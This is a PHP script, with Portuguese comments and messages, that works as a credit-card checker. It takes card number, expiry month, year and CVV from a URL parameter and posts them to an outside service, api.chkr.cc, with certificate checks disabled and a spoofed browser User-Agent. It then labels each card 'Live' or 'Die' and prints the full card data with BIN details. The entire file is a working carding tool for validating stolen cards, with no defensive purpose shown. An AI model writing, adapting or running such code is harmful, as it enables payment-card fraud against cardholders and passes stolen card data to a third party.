
<?php
header('Content-Type: text/html; charset=utf-8');
error_reporting(0);
set_time_limit(0);

$lista = isset($_GET['lista']) ? $_GET['lista'] : '';

if (empty($lista)) {
    die("Lista vazia");
}

$lista = trim($lista);
$separa = explode("|", $lista);

$cc = isset($separa[0]) ? trim($separa[0]) : '';
$mes = isset($separa[1]) ? trim($separa[1]) : '';
$ano = isset($separa[2]) ? trim($separa[2]) : '';
$cvv = isset($separa[3]) ? trim($separa[3]) : '';

if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
    die("❌ Formato inválido. Use: CARD|MES|ANO|CVV");
}

$cardData = $cc . "|" . $mes . "|" . $ano . "|" . $cvv;

// Função para fazer requisição com retry
function makeRequest($cardData, $maxRetries = 2) {
    for ($attempt = 1; $attempt <= $maxRetries; $attempt++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.chkr.cc/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['data' => $cardData]));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept: application/json'
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlError = curl_error($ch);
        curl_close($ch);

        // Se a requisição foi bem-sucedida, retorna
        if ($httpCode == 200 && !empty($response)) {
            return ['success' => true, 'response' => $response];
        }

        // Se não é a última tentativa, aguarda 1 segundo antes de tentar novamente
        if ($attempt < $maxRetries) {
            sleep(1);
        }
    }

    // Se todas as tentativas falharam
    return ['success' => false, 'error' => $curlError ?: 'Timeout'];
}

$result = makeRequest($cardData);

if (!$result['success']) {
    echo "Unknown | $cardData | [BIN: - - -] | API Timeout - Tente novamente";
    die();
}

$response = $result['response'];

$result = json_decode($response, true);

if (!$result || !isset($result['code'])) {
    echo "Unknown | $cardData | [BIN: - - -] | Resposta inválida";
    die();
}

$code = $result['code'];
$status = isset($result['status']) ? $result['status'] : 'Unknown';
$message = isset($result['message']) ? $result['message'] : 'Sem mensagem';

$cardInfo = isset($result['card']) ? $result['card'] : [];
$type = isset($cardInfo['type']) ? $cardInfo['type'] : '';
$category = isset($cardInfo['category']) ? $cardInfo['category'] : '';

$country = isset($cardInfo['country']) ? $cardInfo['country'] : [];
$countryEmoji = isset($country['emoji']) ? $country['emoji'] : '';

$binInfo = "[BIN: $countryEmoji - $type - $category]";

if ($code == 1) {
    echo "Live | $cardData | $binInfo | $message";
} elseif ($code == 0) {
    echo "Die | $cardData | $binInfo | $message";
} else {
    echo "Unknown | $cardData | $binInfo | $message";
}
?>
